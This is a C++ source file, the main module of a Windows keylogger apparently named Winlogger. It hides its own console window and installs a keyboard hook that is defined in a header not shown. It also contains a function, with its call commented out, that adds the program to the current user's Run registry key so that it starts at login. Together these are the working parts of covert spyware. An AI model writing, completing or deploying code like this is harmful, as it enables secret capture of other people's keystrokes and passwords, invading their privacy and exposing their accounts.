#include"KeyBtnHook.h"
#include"Additional.h"

using namespace std;

void createRegister() {
	std::wstring progPath = L"C:\\Users\\D\\source\\repos\\Winlogger\\Debug\\Winlogger.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(
		HKEY_CURRENT_USER, 
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
		&hkey); //Creates a key

	LONG status = RegSetValueEx(
		hkey, 
		L"Winlogger.exe", 
		0, 
		REG_SZ, 
		(BYTE*)progPath.c_str(), 
		(progPath.size() + 1) * sizeof(wchar_t));
}

int main() {
	
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	MSG Msg;

	//Create Data Folder
	Additional AOBJ;
	AOBJ.makedirectory();

	/*createRegister();*/

	// Disabling Animation is Windows
	/*AOBJ.disableAnimationWindows();*/

	//Installing Hook
	Sleep(1000);
	InstallHook();

	while (GetMessage(&Msg, NULL, 0, 0)) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	
	system("Pause");
}